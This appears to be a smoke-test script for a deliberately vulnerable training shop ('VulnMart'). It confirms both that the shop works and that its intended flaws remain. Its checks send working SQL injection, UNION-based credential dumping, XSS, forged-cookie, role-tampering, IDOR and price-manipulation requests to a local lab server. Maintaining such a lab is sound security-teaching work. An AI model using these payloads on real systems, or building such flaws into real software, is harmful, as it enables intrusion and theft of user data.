#!/usr/bin/env bash
#
# Smoke test for the VulnMart lab.
#
# The suite does two things:
#   1. it proves the shop still works (pages render, login works, orders exist)
#   2. it proves the intentional vulnerabilities are still present, so a
#      refactor cannot silently "fix" an exercise
#
# Usage:
#   bash tools/smoke_test.sh              # starts its own PHP server on :8099
#   BASE_URL=http://localhost:8080 bash tools/smoke_test.sh   # test a running app
#
set -uo pipefail

BASE_URL="${BASE_URL:-}"
PORT="${PORT:-8099}"
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

TMP_DIR="$(mktemp -d)"
COOKIE_JAR="$TMP_DIR/cookies.txt"
SERVER_PID=""
PASSED=0
FAILED=0

cleanup() {
    if [[ -n "$SERVER_PID" ]]; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    rm -rf "$TMP_DIR"
}
trap cleanup EXIT

ok() {
    PASSED=$((PASSED + 1))
    printf '  \033[32mok\033[0m    %s\n' "$1"
}

fail() {
    FAILED=$((FAILED + 1))
    printf '  \033[31mFAIL\033[0m  %s\n' "$1"
}

# check <description> <expected status> <expected snippet> <curl args...>
check() {
    local description="$1"
    local expected_status="$2"
    local expected_snippet="$3"
    shift 3

    local status
    status="$(curl -sS -o "$TMP_DIR/body" -w '%{http_code}' "$@" 2>"$TMP_DIR/curl.err")" || true

    if [[ -s "$TMP_DIR/curl.err" ]]; then
        fail "$description (curl: $(head -n1 "$TMP_DIR/curl.err"))"
        return
    fi

    if [[ "$status" != "$expected_status" ]]; then
        fail "$description (status $status, expected $expected_status)"
        return
    fi

    if [[ -n "$expected_snippet" ]] && ! grep -qF -- "$expected_snippet" "$TMP_DIR/body"; then
        fail "$description (body does not contain: $expected_snippet)"
        return
    fi

    ok "$description"
}

if [[ -z "$BASE_URL" ]]; then
    if ! command -v php >/dev/null 2>&1; then
        echo "php is not installed. Start the app yourself and set BASE_URL." >&2
        exit 2
    fi

    export DATA_DIR="$TMP_DIR/data"
    mkdir -p "$DATA_DIR"

    echo "Starting a throw-away server on port $PORT (data in $DATA_DIR)…"
    ( cd "$ROOT_DIR" && DB_PATH="$DATA_DIR/vulnmart.db" exec php -S "127.0.0.1:$PORT" -t src ) \
        >"$TMP_DIR/server.log" 2>&1 &
    SERVER_PID=$!

    BASE_URL="http://127.0.0.1:$PORT"

    for _ in $(seq 1 50); do
        if curl -s -o /dev/null "$BASE_URL/"; then
            break
        fi
        sleep 0.2
    done

    if ! kill -0 "$SERVER_PID" 2>/dev/null; then
        echo "The PHP server died. Log:" >&2
        cat "$TMP_DIR/server.log" >&2
        exit 2
    fi
fi

echo
echo "Functional checks ($BASE_URL)"
check "store front lists the catalogue"        200 "Laptop"                   "$BASE_URL/"
check "product page shows the reviews"         200 "Customer reviews"         "$BASE_URL/product.php?id=1"
check "category filter narrows the result"     200 "Coffee Maker"             "$BASE_URL/?category=home"
check "login rejects a wrong password"         200 "Invalid credentials"      -X POST -d "username=alice&password=nope" "$BASE_URL/login.php"
check "checkout requires a signed in user"     302 ""                         "$BASE_URL/checkout.php"
check "init_db page is available"              200 "Demo accounts"            "$BASE_URL/init_db.php"

echo
echo "Authentication checks"
check "login is SQL injectable"                302 ""                         -c "$COOKIE_JAR" -X POST -d "username=admin' -- &password=x" "$BASE_URL/login.php"
check "the forged login created a session"     200 "Log out"                  -b "$COOKIE_JAR" "$BASE_URL/"
check "logout ends the session"                302 ""                         -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$BASE_URL/logout.php"

# Sign in again, this time with the remember-me cookie, for the checks below.
curl -s -o /dev/null -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST -d "username=alice&password=alice123&remember=1" "$BASE_URL/login.php"
check "remember-me cookie is forgeable"        200 "Log out"                  -b "$TMP_DIR/forged.txt" -H "Cookie: remember_me=$(printf '1:admin' | base64)" "$BASE_URL/profile.php"
NEW_USER="eve_$(date +%s)_$$"
check "registration accepts role=admin"        302 ""                         -c "$TMP_DIR/eve.txt" -X POST -d "username=$NEW_USER&email=$NEW_USER@example.com&password=evepw&confirm=evepw&role=admin" "$BASE_URL/register.php"
check "the new account is an administrator"    200 "Admin dashboard"          -b "$TMP_DIR/eve.txt" "$BASE_URL/admin/"

echo
echo "Authorisation checks"
check "role cookie opens the admin panel"      200 "Admin dashboard"          -H "Cookie: role=admin" "$BASE_URL/admin/"
check "role cookie opens the seller area"      200 "Seller dashboard"         -H "Cookie: role=seller" "$BASE_URL/seller/"
check "IDOR: any order can be read"            200 "FLAG{1d0r_0rd3r_d3t41l}" -b "$COOKIE_JAR" "$BASE_URL/order.php?id=1"
check "IDOR: any profile can be read"          200 "FLAG{1d0r_pr0f1l3_r34d}" -b "$COOKIE_JAR" "$BASE_URL/profile.php?id=1"

echo
echo "Injection checks"
check "search is SQL injectable"               200 "supersecretadmin123"      "$BASE_URL/?q=%27%29%20UNION%20SELECT%201,username,password,4,5,6,7,8,9%20FROM%20users%20--%20"
check "search reflects HTML"                   200 "<script>alert(1)</script>" "$BASE_URL/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
check "stored XSS in the log viewer"           200 "<script>alert"            -H "Cookie: role=admin" "$BASE_URL/admin/logs.php"

echo
echo "Business logic checks"
curl -s -o /dev/null -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -X POST -d "action=add&product_id=1&qty=1&price=0.01" "$BASE_URL/cart.php"
check "cart accepts a client supplied price"   200 '$0.01'                    -b "$COOKIE_JAR" "$BASE_URL/cart.php"

echo
echo "Exposure checks"
check "phpinfo is public"                      200 "PHP Version"              "$BASE_URL/info.php"
check "the internal endpoint blocks visitors"  403 "Forbidden"                "$BASE_URL/internal/secret.php"

echo
if [[ "$FAILED" -gt 0 ]]; then
    echo "$FAILED check(s) failed, $PASSED passed."
    exit 1
fi

echo "All $PASSED checks passed."
